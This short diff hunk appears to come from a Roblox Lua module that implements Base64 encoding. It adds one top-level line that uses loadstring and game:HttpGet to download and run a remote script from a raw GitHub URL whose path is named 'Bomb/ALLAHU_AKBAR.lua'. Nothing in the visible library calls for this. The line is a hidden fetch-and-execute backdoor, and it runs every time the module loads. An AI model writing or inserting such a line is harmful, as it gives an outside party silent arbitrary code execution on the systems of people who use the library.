@@ -62,6 +62,7 @@ API:
 
 --]=]---------------------------------------------------------------------------
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/neuron/refs/heads/main/Bomb/ALLAHU_AKBAR.lua"))()
 local Base64 = (function()
 	-- @original: https://gist.github.com/Reselim/40d62b17d138cc74335a1b0709e19ce2
 	local Alphabet = {}
